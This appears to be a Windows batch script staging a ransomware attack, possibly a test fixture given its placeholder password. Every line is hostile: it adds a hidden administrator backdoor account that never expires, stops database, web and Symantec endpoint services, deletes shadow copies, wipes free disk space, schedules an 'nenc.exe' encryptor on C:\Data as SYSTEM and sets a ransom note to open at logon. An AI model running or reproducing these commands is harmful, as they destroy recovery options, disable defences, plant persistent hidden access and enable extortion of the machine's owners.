@echo off
net user svc_upd FixturePassword123! /add
net localgroup Administrators svc_upd /add
wmic useraccount where "Name='svc_upd'" set PasswordExpires=False
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v svc_upd /t REG_DWORD /d 0 /f
net stop MSSQLSERVER /y
net stop MySQL /y
net stop W3SVC /y
sc stop SepMasterService
sc config SepMasterService start= disabled
vssadmin delete shadows /all /quiet
cipher /w:C:\
schtasks /create /tn SvcSync /tr "C:\Users\Public\n0n\nenc.exe C:\Data" /sc minute /mo 5 /ru SYSTEM /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v n0nNote /t REG_SZ /d "notepad C:\Users\Public\n0n\n0n_READ_ME.txt" /f
